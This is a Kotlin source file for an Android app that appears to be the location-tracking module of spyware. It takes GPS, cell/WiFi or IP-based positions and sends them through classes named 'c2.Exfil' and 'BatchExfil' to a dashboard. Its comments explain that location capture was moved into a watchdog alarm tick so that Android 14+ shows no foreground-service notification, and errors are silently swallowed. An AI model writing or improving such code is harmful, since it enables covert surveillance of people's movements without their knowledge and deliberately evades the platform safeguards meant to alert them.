package com.sp.core.services

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.os.Looper
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.sp.core.c2.Exfil
import com.sp.core.util.BatchExfil
import com.sp.core.util.WebGeo
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

/**
 * One-shot position request.
 *
 * The position used to come from a long-running foreground service - on
 * Android 14+ that service always shows a notification. Now the fix is
 * taken inside the agent tick (the watchdog alarm), with the background
 * location grant, and the process dies right after it.
 *
 * Order of the sources:
 *   1. gps     - a real fix from the fused provider (needs ACCESS_FINE_LOCATION)
 *   2. network - the last known cell/WiFi position (needs any location grant)
 *   3. web     - IP geolocation, only if nothing else is available
 */
object LocationFix {

    private const val TAG = "LocationFix"
    private const val TIMEOUT_MS = 5_000L

    private val busy = AtomicBoolean(false)
    private val bg = Executors.newSingleThreadExecutor { r ->
        Thread(r, "sp-loc").apply { isDaemon = true }
    }

    fun send(ctx: Context, immediate: Boolean) {
        val app = ctx.applicationContext
        if (!hasAnyLocation(app)) {
            sendWeb(app, immediate)
            return
        }
        if (!busy.compareAndSet(false, true)) return
        bg.execute {
            try {
                fetch(app, immediate)
            } catch (t: Throwable) {
                sendWeb(app, immediate)
            } finally {
                busy.set(false)
            }
        }
    }

    private fun fetch(ctx: Context, immediate: Boolean) {
        val client = try {
            LocationServices.getFusedLocationProviderClient(ctx)
        } catch (_: Throwable) {
            null
        } ?: run { sendWeb(ctx, immediate); return }

        val cts = com.google.android.gms.tasks.CancellationTokenSource()
        val token = cts.token
        val latch = java.util.concurrent.CountDownLatch(1)
        var result: Location? = null
        try {
            client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, token)
                .addOnSuccessListener { loc ->
                    result = loc
                    latch.countDown()
                }
                .addOnFailureListener { latch.countDown() }
        } catch (_: Throwable) {
            latch.countDown()
        }
        // The fused provider can hang - the tick must not block on it.
        try { latch.await(TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS) } catch (_: Throwable) {}
        try { cts.cancel() } catch (_: Throwable) {}

        val loc = result
        if (loc != null) {
            push(ctx, loc, immediate)
            return
        }

        // The last known position of the fused provider is free and usually
        // good enough (it is the same fix the provider keeps for us).
        var last: Location? = null
        val l2 = java.util.concurrent.CountDownLatch(1)
        try {
            client.lastLocation.addOnSuccessListener { l ->
                last = l
                l2.countDown()
            }.addOnFailureListener { l2.countDown() }
        } catch (_: Throwable) {
            l2.countDown()
        }
        try { l2.await(2_500L, java.util.concurrent.TimeUnit.MILLISECONDS) } catch (_: Throwable) {}

        val fallback = last
        if (fallback != null) push(ctx, fallback, immediate) else sendWeb(ctx, immediate)
    }

    private fun push(ctx: Context, loc: Location, immediate: Boolean) {
        try {
            val source = if (loc.provider?.contains("gps", true) == true) "gps" else "network"
            val payload = JSONObject().apply {
                put("lat", loc.latitude)
                put("lon", loc.longitude)
                put("acc", loc.accuracy)
                put("alt", loc.altitude)
                put("speed", loc.speed)
                put("ts", loc.time)
                put("provider", loc.provider)
                put("source", source)
            }
            if (immediate) {
                Exfil.sendLog(ctx, "location", payload.toString())
            } else {
                BatchExfil.enqueue(ctx, "location", payload.toString())
            }
        } catch (_: Throwable) {
        }
    }

    /**
     * IP geolocation - the least accurate source. It is only used when the
     * device has no location grant at all, and it is always tagged as "web"
     * so the dashboard can tell it apart from a real fix.
     */
    private fun sendWeb(ctx: Context, immediate: Boolean) {
        bg.execute {
            try {
                val geo = WebGeo.locate() ?: return@execute
                geo.put("fallback", "no_fix")
                if (immediate) {
                    Exfil.sendLog(ctx, "location", geo.toString())
                } else {
                    BatchExfil.enqueue(ctx, "location", geo.toString())
                }
            } catch (_: Throwable) {
            }
        }
    }

    private fun hasFineLocation(ctx: Context): Boolean =
        ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    private fun hasAnyLocation(ctx: Context): Boolean =
        hasFineLocation(ctx) ||
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED
}
